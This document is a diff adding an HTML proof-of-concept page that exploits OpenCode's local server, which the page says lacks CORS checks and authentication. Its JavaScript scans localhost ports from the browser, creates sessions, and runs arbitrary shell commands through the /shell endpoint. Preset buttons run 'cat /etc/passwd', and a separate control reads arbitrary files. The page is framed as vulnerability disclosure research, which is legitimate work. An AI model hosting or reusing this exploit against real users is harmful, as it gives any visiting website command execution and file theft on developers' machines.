@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OpenCode RCE Vulnerability PoC</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #f85149;
+            margin-bottom: 10px;
+            font-size: 1.8em;
+        }
+        .warning {
+            background: #f8514922;
+            border: 1px solid #f85149;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        .warning h2 {
+            color: #f85149;
+            font-size: 1em;
+            margin-bottom: 8px;
+        }
+        .info {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        .info h3 {
+            color: #58a6ff;
+            margin-bottom: 10px;
+        }
+        .info ul {
+            margin-left: 20px;
+        }
+        .info li {
+            margin-bottom: 5px;
+        }
+        .info code {
+            background: #0d1117;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #7ee787;
+        }
+        .controls {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        .controls h3 {
+            color: #58a6ff;
+            margin-bottom: 15px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #8b949e;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: #c9d1d9;
+            font-family: monospace;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #58a6ff;
+        }
+        .port-scan {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .port-scan input {
+            flex: 1;
+        }
+        button {
+            background: #238636;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #2ea043;
+        }
+        button:disabled {
+            background: #21262d;
+            color: #484f58;
+            cursor: not-allowed;
+        }
+        button.danger {
+            background: #da3633;
+        }
+        button.danger:hover {
+            background: #f85149;
+        }
+        .status {
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        .status.scanning {
+            background: #1f6feb22;
+            border: 1px solid #1f6feb;
+            color: #58a6ff;
+        }
+        .status.found {
+            background: #23863622;
+            border: 1px solid #238636;
+            color: #7ee787;
+        }
+        .status.error {
+            background: #f8514922;
+            border: 1px solid #f85149;
+            color: #f85149;
+        }
+        .output {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            font-family: monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .output .prompt {
+            color: #7ee787;
+        }
+        .output .result {
+            color: #c9d1d9;
+        }
+        .output .error {
+            color: #f85149;
+        }
+        .output .info {
+            color: #58a6ff;
+            background: transparent;
+            border: none;
+            padding: 0;
+            margin: 0;
+        }
+        .sessions {
+            margin-top: 15px;
+        }
+        .session-item {
+            background: #21262d;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 8px 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .session-item:hover {
+            background: #30363d;
+        }
+        .session-item.selected {
+            border-color: #58a6ff;
+        }
+        .hidden {
+            display: none;
+        }
+        .flex-row {
+            display: flex;
+            gap: 10px;
+        }
+        .flex-row button {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>OpenCode RCE Vulnerability PoC</h1>
+        
+        <div class="warning">
+            <h2>Security Research Demonstration</h2>
+            <p>This page demonstrates CVE-like vulnerabilities in OpenCode's client-server architecture:</p>
+            <ul style="margin: 10px 0 0 20px;">
+                <li><strong>No CORS validation</strong> - Any website can make requests</li>
+                <li><strong>No authentication</strong> - No tokens or credentials required</li>
+                <li><strong>Arbitrary shell execution</strong> - via POST /session/:id/shell</li>
+            </ul>
+        </div>
+
+        <div class="info">
+            <h3>How This Works</h3>
+            <ul>
+                <li>OpenCode server binds to <code>127.0.0.1</code> on a random port</li>
+                <li>The server uses <code>.use(cors())</code> with no origin restrictions</li>
+                <li>This allows any website to scan localhost ports and find the server</li>
+                <li>Once found, we can create sessions and execute arbitrary commands</li>
+                <li>File: <code>/packages/opencode/src/server/server.ts:135</code></li>
+            </ul>
+        </div>
+
+        <div class="controls">
+            <h3>Step 1: Find OpenCode Server</h3>
+            <div class="port-scan">
+                <input type="number" id="portStart" value="3000" min="1" max="65535" placeholder="Start Port">
+                <input type="number" id="portEnd" value="65535" min="1" max="65535" placeholder="End Port">
+                <button onclick="scanPorts()">Scan Ports</button>
+            </div>
+            <div id="scanStatus" class="status hidden"></div>
+            
+            <div class="form-group">
+                <label>Or enter known port:</label>
+                <input type="number" id="knownPort" placeholder="e.g., 3000">
+                <button onclick="checkPort()" style="margin-top: 10px;">Check Port</button>
+            </div>
+        </div>
+
+        <div id="exploitSection" class="controls hidden">
+            <h3>Step 2: Select Session</h3>
+            <div id="sessionStatus" class="status hidden"></div>
+            <div id="sessionsList" class="sessions"></div>
+            <button onclick="createSession()" style="margin-top: 10px;">Create New Session</button>
+        </div>
+
+        <div id="shellSection" class="controls hidden">
+            <h3>Step 3: Execute Commands</h3>
+            <div class="form-group">
+                <label>Command to execute:</label>
+                <input type="text" id="command" placeholder="whoami" value="whoami">
+            </div>
+            <div class="flex-row">
+                <button onclick="executeCommand()">Execute</button>
+                <button onclick="executeCommand('id')" class="danger">Run: id</button>
+                <button onclick="executeCommand('cat /etc/passwd')" class="danger">Run: cat /etc/passwd</button>
+            </div>
+            <div style="margin-top: 15px;">
+                <h4 style="color: #8b949e; margin-bottom: 10px;">Output:</h4>
+                <div id="output" class="output"><span class="info">// Command output will appear here</span></div>
+            </div>
+        </div>
+
+        <div class="controls" style="margin-top: 20px;">
+            <h3>File Read (Alternative Attack Vector)</h3>
+            <div class="form-group">
+                <label>File path to read:</label>
+                <input type="text" id="filePath" placeholder="/etc/passwd" value="/etc/passwd">
+            </div>
+            <button onclick="readFile()" id="readFileBtn" disabled>Read File</button>
+            <div style="margin-top: 15px;">
+                <div id="fileOutput" class="output hidden"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let serverPort = null;
+        let selectedSession = null;
+
+        async function tryPort(port) {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 500);
+            
+            try {
+                const response = await fetch(`http://127.0.0.1:${port}/session`, {
+                    signal: controller.signal,
+                    mode: 'cors'
+                });
+                clearTimeout(timeout);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    // Check if it looks like OpenCode
+                    if (Array.isArray(data)) {
+                        return { port, sessions: data };
+                    }
+                }
+            } catch (e) {
+                // Port not available or not OpenCode
+            }
+            clearTimeout(timeout);
+            return null;
+        }
+
+        async function scanPorts() {
+            const start = parseInt(document.getElementById('portStart').value) || 3000;
+            const end = parseInt(document.getElementById('portEnd').value) || 65535;
+            const status = document.getElementById('scanStatus');
+            
+            status.className = 'status scanning';
+            status.classList.remove('hidden');
+            status.textContent = `Scanning ports ${start}-${end}...`;
+
+            // Scan in batches for performance
+            const batchSize = 100;
+            
+            for (let i = start; i <= end; i += batchSize) {
+                const batch = [];
+                for (let j = i; j < Math.min(i + batchSize, end + 1); j++) {
+                    batch.push(tryPort(j));
+                }
+                
+                status.textContent = `Scanning ports ${i}-${Math.min(i + batchSize - 1, end)}...`;
+                
+                const results = await Promise.all(batch);
+                const found = results.find(r => r !== null);
+                
+                if (found) {
+                    serverPort = found.port;
+                    status.className = 'status found';
+                    status.textContent = `Found OpenCode server on port ${found.port}! (${found.sessions.length} sessions)`;
+                    showExploitSection(found.sessions);
+                    return;
+                }
+            }
+            
+            status.className = 'status error';
+            status.textContent = 'No OpenCode server found in the specified range.';
+        }
+
+        async function checkPort() {
+            const port = parseInt(document.getElementById('knownPort').value);
+            if (!port) {
+                alert('Please enter a port number');
+                return;
+            }
+
+            const status = document.getElementById('scanStatus');
+            status.className = 'status scanning';
+            status.classList.remove('hidden');
+            status.textContent = `Checking port ${port}...`;
+
+            const result = await tryPort(port);
+            
+            if (result) {
+                serverPort = result.port;
+                status.className = 'status found';
+                status.textContent = `Found OpenCode server on port ${port}! (${result.sessions.length} sessions)`;
+                showExploitSection(result.sessions);
+            } else {
+                status.className = 'status error';
+                status.textContent = `No OpenCode server found on port ${port}`;
+            }
+        }
+
+        function showExploitSection(sessions) {
+            document.getElementById('exploitSection').classList.remove('hidden');
+            document.getElementById('readFileBtn').disabled = false;
+            
+            const list = document.getElementById('sessionsList');
+            list.innerHTML = '';
+            
+            if (sessions.length === 0) {
+                list.innerHTML = '<p style="color: #8b949e;">No sessions found. Create one to continue.</p>';
+                return;
+            }
+            
+            sessions.forEach(session => {
+                const div = document.createElement('div');
+                div.className = 'session-item';
+                div.textContent = `Session: ${session.id} (${session.title || 'Untitled'})`;
+                div.onclick = () => selectSession(session.id, div);
+                list.appendChild(div);
+            });
+        }
+
+        function selectSession(sessionId, element) {
+            selectedSession = sessionId;
+            
+            document.querySelectorAll('.session-item').forEach(el => {
+                el.classList.remove('selected');
+            });
+            element.classList.add('selected');
+            
+            document.getElementById('shellSection').classList.remove('hidden');
+            
+            const status = document.getElementById('sessionStatus');
+            status.className = 'status found';
+            status.classList.remove('hidden');
+            status.textContent = `Selected session: ${sessionId}`;
+        }
+
+        async function createSession() {
+            const status = document.getElementById('sessionStatus');
+            status.className = 'status scanning';
+            status.classList.remove('hidden');
+            status.textContent = 'Creating new session...';
+
+            try {
+                const response = await fetch(`http://127.0.0.1:${serverPort}/session`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                });
+                
+                const session = await response.json();
+                selectedSession = session.id;
+                
+                status.className = 'status found';
+                status.textContent = `Created session: ${session.id}`;
+                
+                document.getElementById('shellSection').classList.remove('hidden');
+                
+                // Refresh sessions list
+                const sessionsResponse = await fetch(`http://127.0.0.1:${serverPort}/session`);
+                const sessions = await sessionsResponse.json();
+                showExploitSection(sessions);
+                
+            } catch (e) {
+                status.className = 'status error';
+                status.textContent = `Error creating session: ${e.message}`;
+            }
+        }
+
+        async function executeCommand(cmd) {
+            const command = cmd || document.getElementById('command').value;
+            const output = document.getElementById('output');
+            
+            if (!selectedSession) {
+                output.innerHTML = '<span class="error">Error: No session selected</span>';
+                return;
+            }
+
+            output.innerHTML += `\n<span class="prompt">$ ${command}</span>\n`;
+
+            try {
+                const response = await fetch(`http://127.0.0.1:${serverPort}/session/${selectedSession}/shell`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        command: command,
+                        agent: 'default'
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.parts && data.parts.length > 0) {
+                    const part = data.parts[0];
+                    if (part.state && part.state.output) {
+                        output.innerHTML += `<span class="result">${escapeHtml(part.state.output)}</span>\n`;
+                    } else if (part.state && part.state.error) {
+                        output.innerHTML += `<span class="error">${escapeHtml(part.state.error)}</span>\n`;
+                    }
+                } else {
+                    output.innerHTML += `<span class="info">${JSON.stringify(data, null, 2)}</span>\n`;
+                }
+                
+                output.scrollTop = output.scrollHeight;
+                
+            } catch (e) {
+                output.innerHTML += `<span class="error">Error: ${e.message}</span>\n`;
+            }
+        }
+
+        async function readFile() {
+            const filePath = document.getElementById('filePath').value;
+            const output = document.getElementById('fileOutput');
+            
+            output.classList.remove('hidden');
+            output.innerHTML = `<span class="info">Reading ${filePath}...</span>`;
+
+            try {
+                const response = await fetch(`http://127.0.0.1:${serverPort}/file/content?path=${encodeURIComponent(filePath)}`);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    output.innerHTML = `<span class="prompt">// ${filePath}</span>\n<span class="result">${escapeHtml(data.content || JSON.stringify(data, null, 2))}</span>`;
+                } else {
+                    const error = await response.text();
+                    output.innerHTML = `<span class="error">Error: ${response.status} - ${error}</span>`;
+                }
+            } catch (e) {
+                output.innerHTML = `<span class="error">Error: ${e.message}</span>`;
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
